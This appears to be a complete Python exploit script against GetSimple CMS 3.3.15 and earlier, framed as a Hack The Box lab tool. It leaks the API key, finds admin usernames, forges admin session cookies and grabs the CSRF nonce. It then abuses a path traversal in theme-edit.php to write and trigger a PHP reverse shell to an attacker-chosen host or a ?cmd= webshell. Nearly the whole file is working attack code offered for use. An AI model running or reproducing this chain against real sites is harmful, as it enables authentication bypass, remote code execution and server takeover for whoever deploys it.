#!/usr/bin/env python3
"""
GetSimple CMS <= 3.3.15 foothold script (auth bypass + theme-edit RCE)

Attack chain:
  1. Leak API key from /data/other/authorization.xml (often exposed due to .htaccess misconfig)
  2. Optionally enumerate admin username from /data/users/
  3. Forge the GetSimple admin session cookies using the leaked API key
  4. Fetch CSRF nonce from /admin/theme-edit.php
  5. Write a PHP payload via theme-edit.php (edited_file path traversal)
  6. Trigger the payload for a foothold

Tested target class: GetSimple CMS 3.3.15 (HTB/lab use).
Requires: requests (pip install requests)

Examples:
  # Reverse shell (start your listener first: nc -lvnp 4444)
  python3 getsimple_3315_foothold.py http://10.10.10.10/ --lhost 10.10.14.2 --lport 4444

  # Auto-discover username, custom CMS path
  python3 getsimple_3315_foothold.py http://target/GetSimpleCMS/ -l 10.10.14.2 -p 4444

  # Specify username explicitly
  python3 getsimple_3315_foothold.py http://10.10.10.10/ -u admin -l 10.10.14.2 -p 4444

  # Drop a simple command webshell instead of a reverse shell
  python3 getsimple_3315_foothold.py http://10.10.10.10/ --webshell
  # then: curl 'http://10.10.10.10/theme/foothold.php?cmd=id'
"""

from __future__ import annotations

import argparse
import hashlib
import re
import sys
from urllib.parse import urljoin, urlparse
from xml.etree import ElementTree

try:
    import requests
except ImportError:
    print("[-] Missing dependency: requests (pip install requests)")
    sys.exit(1)


class GetSimpleFoothold:
    def __init__(self, base_url: str, username: str | None, lhost: str | None, lport: int | None,
                 webshell: bool = False, timeout: int = 10, proxy: str | None = None):
        self.base_url = base_url.rstrip("/") + "/"
        self.username = username
        self.lhost = lhost
        self.lport = lport
        self.webshell = webshell
        self.timeout = timeout
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({"User-Agent": "Mozilla/5.0 (HTB lab foothold)"})
        if proxy:
            self.s.proxies.update({"http": proxy, "https": proxy})
        self.version: str | None = None
        self.apikey: str | None = None

    def url(self, path: str) -> str:
        return urljoin(self.base_url, path.lstrip("/"))

    def info(self, msg: str) -> None:
        print(f"[+] {msg}")

    def warn(self, msg: str) -> None:
        print(f"[!] {msg}")

    def err(self, msg: str) -> None:
        print(f"[-] {msg}")

    def get_version(self) -> bool:
        try:
            r = self.s.get(self.url("admin/index.php"), timeout=self.timeout)
        except requests.RequestException as e:
            self.err(f"Failed to reach target: {e}")
            return False
        m = re.search(r'jquery\.getsimple\.js\?v=([^"\'&]+)', r.text)
        if not m:
            self.warn("Could not fingerprint version from admin/index.php; continuing with 3.3.15 assumptions")
            self.version = "3.3.15"
            return True
        self.version = m.group(1).strip()
        self.info(f"Detected GetSimple version: {self.version}")
        if self.version > "3.3.16":
            self.warn("Version appears newer than expected; exploit chain may not apply")
        return True

    def leak_apikey(self) -> bool:
        endpoints = [
            "data/other/authorization.xml",
            "data/other/authorization.xml.bak",
        ]
        for ep in endpoints:
            try:
                r = self.s.get(self.url(ep), timeout=self.timeout)
            except requests.RequestException:
                continue
            if not r.ok or "<apikey" not in r.text.lower():
                continue
            try:
                tree = ElementTree.fromstring(r.content)
                # expected: <item><apikey>...</apikey></item>
                apikey = (tree.findtext(".//apikey") or (tree[0].text if len(tree) else "") or "").strip()
            except Exception:
                m = re.search(r"<apikey>([^<]+)</apikey>", r.text)
                apikey = m.group(1).strip() if m else ""
            if apikey:
                self.apikey = apikey
                self.info(f"Leaked API key from /{ep}: {self.apikey}")
                return True
        self.err("Could not leak API key (authorization.xml not accessible)")
        return False

    def discover_username(self) -> bool:
        if self.username:
            self.info(f"Using provided username: {self.username}")
            return True
        try:
            r = self.s.get(self.url("data/users/"), timeout=self.timeout)
        except requests.RequestException as e:
            self.err(f"Failed to enumerate users: {e}")
            return False
        # directory listing: href="admin.xml"
        names = re.findall(r'href="([^"/]+)\.xml"', r.text, flags=re.I)
        names = [n for n in names if n.lower() not in {"index"}]
        if names:
            self.username = names[0]
            self.info(f"Discovered username from /data/users/: {self.username} (candidates: {names})")
            return True
        self.err("Could not discover username. Re-run with --username <name> (common: admin)")
        return False

    def forge_cookies(self) -> bool:
        if not (self.version and self.apikey and self.username):
            return False
        ver = self.version.replace(".", "")
        cookie_name = hashlib.sha1(f"getsimple_cookie_{ver}{self.apikey}".encode()).hexdigest()
        cookie_value = hashlib.sha1(f"{self.username}{self.apikey}".encode()).hexdigest()
        self.s.cookies.set("GS_ADMIN_USERNAME", self.username)
        self.s.cookies.set(cookie_name, cookie_value)
        self.info(f"Forged auth cookies for user '{self.username}'")
        return True

    def get_nonce(self) -> str | None:
        try:
            r = self.s.get(self.url("admin/theme-edit.php"), timeout=self.timeout)
        except requests.RequestException as e:
            self.err(f"Failed to fetch theme-edit.php: {e}")
            return None
        if "login" in r.url.lower() and "theme-edit" not in r.url.lower():
            self.err("Session not accepted (redirected to login). Username/API key/cookie forgery may be wrong.")
            return None
        m = re.search(r'nonce"\s+type="hidden"\s+value="([^"]+)"', r.text)
        if not m:
            m = re.search(r'name="nonce"\s+value="([^"]+)"', r.text)
        if not m:
            self.err("Could not extract CSRF nonce from theme-edit.php")
            # helpful debug hint
            if "theme-edit" not in r.text.lower() and "template" not in r.text.lower():
                self.warn("Response does not look like the theme editor; auth bypass likely failed")
            return None
        nonce = m.group(1)
        self.info(f"Obtained CSRF nonce: {nonce}")
        return nonce

    def build_payload(self) -> tuple[str, str]:
        """Returns (filename, php_content)."""
        if self.webshell:
            fname = "foothold.php"
            content = "<?php if(isset($_REQUEST['cmd'])){echo '<pre>';system($_REQUEST['cmd']);echo '</pre>';}; ?>"
            return fname, content
        assert self.lhost and self.lport
        fname = "shell.php"
        content = (
            "<?php "
            f"$ip='{self.lhost}'; $port={int(self.lport)}; "
            "$sock=@fsockopen($ip,$port); "
            "if($sock){$proc=@proc_open('/bin/sh -i',array(0=>$sock,1=>$sock,2=>$sock),$pipes);} "
            "?>"
        )
        return fname, content

    def upload_payload(self, nonce: str) -> str | None:
        fname, content = self.build_payload()
        # theme-edit.php saves relative to theme dir; '../' lands in site root
        edited_file = f"../{fname}"
        data = {
            "content": content,
            "edited_file": edited_file,
            "nonce": nonce,
            "submitsave": "Save Updates",
        }
        try:
            r = self.s.post(self.url("admin/theme-edit.php"), data=data, timeout=self.timeout)
        except requests.RequestException as e:
            self.err(f"Upload request failed: {e}")
            return None
        # crude success check; GS often redirects/shows success text
        if r.status_code == 200 and "CSRF detected" not in r.text:
            self.info(f"Payload upload submitted as {edited_file}")
            return fname
        self.err("Payload upload may have failed (check response/CSRF)")
        return fname  # still try to trigger; sometimes it lands anyway

    def trigger(self, fname: str) -> None:
        target = self.url(fname)
        if self.webshell:
            self.info(f"Webshell URL: {target}?cmd=id")
            try:
                r = self.s.get(target, params={"cmd": "id"}, timeout=self.timeout)
                if r.ok and ("uid=" in r.text or "gid=" in r.text):
                    self.info("Webshell appears to work. Sample output:")
                    print("-" * 60)
                    # strip tags loosely
                    text = re.sub(r"<[^>]+>", "", r.text).strip()
                    print(text[:2000])
                    print("-" * 60)
                else:
                    self.warn(f"Triggered {target} (HTTP {r.status_code}); verify manually if needed")
            except requests.RequestException as e:
                self.warn(f"Trigger request error: {e}")
            return

        self.info(f"Triggering reverse shell at {target}")
        self.info(f"Make sure your listener is running: nc -lvnp {self.lport}")
        try:
            # don't wait long; reverse shell connects back
            self.s.get(target, timeout=5)
        except requests.exceptions.ReadTimeout:
            self.info("Request timed out (often normal if the reverse shell connected)")
        except requests.RequestException as e:
            self.warn(f"Trigger request error: {e}")
        self.info("If no shell arrived, check listener/firewall/LHOST reachability from target")

    def run(self) -> int:
        parsed = urlparse(self.base_url)
        self.info(f"Target: {self.base_url}")
        if not parsed.scheme.startswith("http"):
            self.err("Target must be an http(s) URL")
            return 1
        if not self.webshell and (not self.lhost or not self.lport):
            self.err("Reverse-shell mode requires --lhost and --lport (or use --webshell)")
            return 1

        if not self.get_version():
            return 1
        if not self.leak_apikey():
            return 1
        if not self.discover_username():
            return 1
        if not self.forge_cookies():
            return 1
        nonce = self.get_nonce()
        if not nonce:
            return 1
        fname = self.upload_payload(nonce)
        if not fname:
            return 1
        self.trigger(fname)
        return 0


def main() -> int:
    # suppress insecure-request warnings for lab targets
    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]

    ap = argparse.ArgumentParser(description="GetSimple CMS <= 3.3.15 auth bypass + theme-edit foothold")
    ap.add_argument("url", help="Base URL of the CMS (e.g. http://10.10.10.10/ or http://host/getsimple/)")
    ap.add_argument("-u", "--username", help="Admin username (auto-discovered from /data/users/ if omitted)")
    ap.add_argument("-l", "--lhost", help="Listener IP for reverse shell")
    ap.add_argument("-p", "--lport", type=int, help="Listener port for reverse shell")
    ap.add_argument("--webshell", action="store_true", help="Drop a simple ?cmd= webshell instead of a reverse shell")
    ap.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080")
    ap.add_argument("--timeout", type=int, default=10, help="HTTP timeout seconds (default: 10)")
    args = ap.parse_args()

    return GetSimpleFoothold(
        base_url=args.url,
        username=args.username,
        lhost=args.lhost,
        lport=args.lport,
        webshell=args.webshell,
        timeout=args.timeout,
        proxy=args.proxy,
    ).run()


if __name__ == "__main__":
    raise SystemExit(main())
